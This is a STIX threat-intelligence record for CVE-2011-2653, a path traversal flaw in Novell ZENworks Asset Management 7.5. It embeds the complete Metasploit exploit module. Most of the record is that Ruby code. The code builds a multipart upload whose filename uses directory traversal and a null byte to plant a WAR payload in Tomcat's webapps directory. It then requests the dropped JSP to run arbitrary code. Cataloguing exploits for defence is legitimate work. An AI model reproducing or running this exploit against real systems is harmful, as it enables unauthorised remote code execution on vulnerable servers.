{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b39edef-6e92-4c77-85f2-4fc446c7efcb",
    "created": "2024-08-14T16:54:47.106598Z",
    "modified": "2024-08-14T16:54:47.106602Z",
    "name": "Novell ZENworks Asset Management Remote Execution",
    "description": " This module exploits a path traversal flaw in Novell ZENworks Asset Management 7.5. By exploiting the CatchFileServlet, an attacker can upload a malicious file outside of the MalibuUploadDirectory and then make a secondary request that allows for arbitrary code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/zenworks_assetmgmt_uploadservlet.rb",
            "external_id": "zenworks_assetmgmt_uploadservlet.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2653"
        },
        {
            "source_name": "reference",
            "url": "http://download.novell.com/Download?buildid=hPvHtXeNmCU~"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Novell ZENworks Asset Management Remote Execution',\n      'Description' => %q{\n          This module exploits a path traversal flaw in Novell ZENworks Asset Management\n        7.5. By exploiting the CatchFileServlet, an attacker can upload a malicious file\n        outside of the MalibuUploadDirectory and then make a secondary request that allows\n        for arbitrary code execution.\n      },\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2011-2653' ],\n          [ 'OSVDB', '77583' ],\n          [ 'BID', '50966' ],\n          [ 'ZDI', '11-342' ],\n          [ 'URL', 'http://download.novell.com/Download?buildid=hPvHtXeNmCU~' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => [ 'java' ],\n      'Targets'     =>\n        [\n          [ 'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            },\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-11-02'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptInt.new('DEPTH', [true, 'Traversal depth to reach the Tomcat webapps dir', 3])\n      ])\n  end\n\n  def exploit\n\n    # Generate the WAR containing the payload\n    app_base = rand_text_alphanumeric(4+rand(32-4))\n    jsp_name = rand_text_alphanumeric(8+rand(8))\n    war_data = payload.encoded_war(:app_name => app_base, :jsp_name => jsp_name).to_s\n\n    uid  = rand_text_alphanumeric(34).to_s\n\n    data =  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"RequestParms\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"language\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"rtyp\\\"\\r\\n\\r\\n\"\n    data << \"prod\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"sess\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"mode\\\"\\r\\n\\r\\n\"\n    data << \"newreport\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"dp\\\"\\r\\n\\r\\n\"\n    data << \"n\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"console\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"oldentry\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"act\\\"\\r\\n\\r\\n\"\n    data << \"malibu.StartImportPAC\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"saveact\\\"\\r\\n\\r\\n\"\n    data << \"malibu.StartImportPAC\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"isalert\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"language\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"queryid\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"Locale\\\"\\r\\n\\r\\n\"\n    data << \"MM/dd/yyyy\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"CurrencySym\\\"\\r\\n\\r\\n\"\n    data << \"$\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"CurrencyPos\\\"\\r\\n\\r\\n\"\n    data << \"start\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"ThousandsSep\\\"\\r\\n\\r\\n\"\n    data << \",\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"CurDecimalPt\\\"\\r\\n\\r\\n\"\n    data << \".\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"MinusSign\\\"\\r\\n\\r\\n\"\n    data << \"-\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"sum\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"grp\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"col\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"PreLoadRight\\\"\\r\\n\\r\\n\"\n    data << \"yes\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"console\\\"\\r\\n\\r\\n\"\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"uploadFile\\\"; filename=\\\"/#{\"../\" * datastore['DEPTH']}#{app_base}.war\\x00.txt\\\"\\r\\n\"\n    data << \"Content-Type: application/octet-stream\\r\\n\\r\\n\"\n    data << war_data\n    data << \"\\r\\n\"\n    data <<  \"------#{uid}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"SuccessPage\\\"\\r\\n\\r\\n\"\n    data << \"Html/UploadSuccess.html\\r\\n\"\n    data <<  \"------#{uid}--\\r\\n\"\n\n    res = send_request_cgi(\n      {\n        'uri'    => \"/rtrlet/catch\",\n        'method' => 'POST',\n        'ctype'   => \"multipart/form-data; boundary=----#{uid}\",\n        'data'    => data,\n      })\n\n    print_status(\"Uploading #{war_data.length} bytes as #{app_base}.war ...\")\n\n    select(nil, nil, nil, 10)\n\n    if (res.code == 500)\n      print_status(\"Triggering payload at '/#{app_base}/#{jsp_name}.jsp' ...\")\n        send_request_raw(\n          {\n            'uri'    => \"/#{app_base}/\" + \"#{jsp_name}\" + '.jsp',\n            'method' => 'GET',\n          })\n    else\n      print_error(\"WAR upload failed...\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-02",
    "x_mitre_platforms": [
        "java"
    ]
}